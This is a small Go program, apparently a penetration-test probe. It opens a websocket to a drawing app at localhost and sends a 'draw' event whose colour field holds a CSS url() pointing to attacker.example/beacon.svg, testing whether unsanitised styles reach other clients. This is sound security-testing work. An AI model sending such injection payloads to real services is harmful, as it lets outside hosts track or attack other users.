package main

import (
	"encoding/binary"
	"fmt"
	"golang.org/x/net/websocket"
	"time"
)

func send(ws *websocket.Conn, payload string) error {
	b := []byte(payload)
	hdr := make([]byte, 4)
	binary.LittleEndian.PutUint32(hdr, uint32(len(b)))
	_, err := ws.Write(append(hdr, b...))
	return err
}

func readFor(ws *websocket.Conn, d time.Duration, tag string) {
	deadline := time.Now().Add(d)
	buf := make([]byte, 65536)
	for {
		ws.SetReadDeadline(deadline)
		n, err := ws.Read(buf)
		if err != nil { fmt.Printf("[%s] read end: %v\n", tag, err); return }
		fmt.Printf("[%s] got: %.500s\n", tag, buf[:n])
	}
}

func main() {
	ws, err := websocket.Dial("ws://localhost:8091/socket/b/pentest", "", "http://localhost:8091/")
	if err != nil { panic(err) }
	defer ws.Close()
	readFor(ws, 1*time.Second, "init")
	payload := `{"event":"draw","value":[0.1,0.1,0.5,0.5,"url(//attacker.example/beacon.svg#p)"]}`
	fmt.Println("-- sending draw with url() color")
	if err := send(ws, payload); err != nil { panic(err) }
	readFor(ws, 2*time.Second, "after-draw")
}
